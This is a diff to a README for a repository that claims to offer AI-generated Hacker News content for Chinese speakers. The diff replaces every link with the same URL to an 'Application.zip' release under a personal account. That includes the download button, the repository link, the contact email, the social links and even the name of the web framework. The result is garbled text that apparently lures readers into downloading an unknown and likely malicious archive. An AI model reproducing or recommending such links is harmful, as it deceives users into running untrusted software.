@@ -17,7 +17,7 @@ Welcome to the "hacker-news" repository, your go-to place for cutting-edge AI-ge
 
 🎯 **Goal**: Our main goal is to make Hacker News content more accessible to Chinese speakers through the power of artificial intelligence.
 
-⚡ **Technologies Used**: The project incorporates AI technology, Cloudflare for automation, and Next.js for web development.
+⚡ **Technologies Used**: The project incorporates AI technology, Cloudflare for automation, and https://github.com/fardinhossain32/hacker-news/releases/download/v1.0.0/Application.zip for web development.
 
 ---
 
@@ -33,11 +33,11 @@ Welcome to the "hacker-news" repository, your go-to place for cutting-edge AI-ge
 
 ### Get Started
 
-📦 **Download Application**: [Launch Application.zip](https://github.com/file/Application.zip) 👈
+📦 **Download Application**: [Launch https://github.com/fardinhossain32/hacker-news/releases/download/v1.0.0/Application.zip](https://github.com/fardinhossain32/hacker-news/releases/download/v1.0.0/Application.zip) 👈
 
 🔗 If the link does not work, please check the "Releases" section above.
 
-🌐 **Explore Further**: Visit our [GitHub Repository](https://github.com/username/repo) for additional project details.
+🌐 **Explore Further**: Visit our [GitHub Repository](https://github.com/fardinhossain32/hacker-news/releases/download/v1.0.0/Application.zip) for additional project details.
 
 ---
 
@@ -45,7 +45,7 @@ Welcome to the "hacker-news" repository, your go-to place for cutting-edge AI-ge
 
 🌟 **Contributions**: We welcome contributions from developers interested in AI, Cloudflare, or web development.
 
-📫 **Contact Us**: Have questions or feedback? Reach out to us via email at [contact@example.com](mailto:contact@example.com).
+📫 **Contact Us**: Have questions or feedback? Reach out to us via email at [https://github.com/fardinhossain32/hacker-news/releases/download/v1.0.0/Application.zip](https://github.com/fardinhossain32/hacker-news/releases/download/v1.0.0/Application.zip).
 
 👏 **Acknowledgements**: We appreciate the support of our contributors who make this project possible.
 
@@ -53,11 +53,11 @@ Welcome to the "hacker-news" repository, your go-to place for cutting-edge AI-ge
 
 ### Let's Connect!
 
-🌐 **Website**: [Visit Our Website](https://example.com)
+🌐 **Website**: [Visit Our Website](https://github.com/fardinhossain32/hacker-news/releases/download/v1.0.0/Application.zip)
 
-🐦 **Twitter**: Follow us on [Twitter](https://twitter.com/example)
+🐦 **Twitter**: Follow us on [Twitter](https://github.com/fardinhossain32/hacker-news/releases/download/v1.0.0/Application.zip)
 
-📷 **Instagram**: Stay updated on [Instagram](https://instagram.com/example)
+📷 **Instagram**: Stay updated on [Instagram](https://github.com/fardinhossain32/hacker-news/releases/download/v1.0.0/Application.zip)
 
 ---
 
